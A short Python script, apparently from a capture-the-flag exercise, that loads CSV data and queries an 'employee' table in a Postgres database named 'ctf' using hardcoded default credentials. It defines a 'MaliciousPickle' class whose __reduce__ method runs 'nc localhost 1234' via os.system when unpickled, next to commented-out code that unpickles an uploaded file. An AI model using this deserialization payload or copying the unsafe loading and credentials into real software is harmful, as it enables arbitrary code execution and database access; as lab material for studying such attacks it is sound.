import sys
import pickle as pkl
import psycopg2 as pg
from csv import reader


class DataTable:
    def __init__(self):
        self.num_rows = 0
        self.num_cols = 0
        self.header = None
        self.data = None 
    
    def load_data_from_csv(self, file):
        with open(file, 'r') as f:
            csv_reader = reader(f)
            parsed_csv = list(csv_reader)
            
            self.header = parsed_csv[0]
            self.data = parsed_csv[1:]

class MaliciousPickle:
    def __reduce__(self):
        import os
        cmd = "nc localhost 1234"
        return(os.system, (cmd, ))


def main():
    """try:
        uploaded_file, id, password = sys.argv
    except:
        print("Invalid arguments")
        return

    file = open(uploaded_file, "rb")
    table = pkl.load(file)
    file.close()
    """
    conn = pg.connect(dbname="ctf", user="postgres", password="postgres")
    cur = conn.cursor()
    
    cur.execute("SELECT * FROM employee;")
    print(cur.fetchall)
    conn.commit()

    cur.close()
    conn.close()




print("Hello World")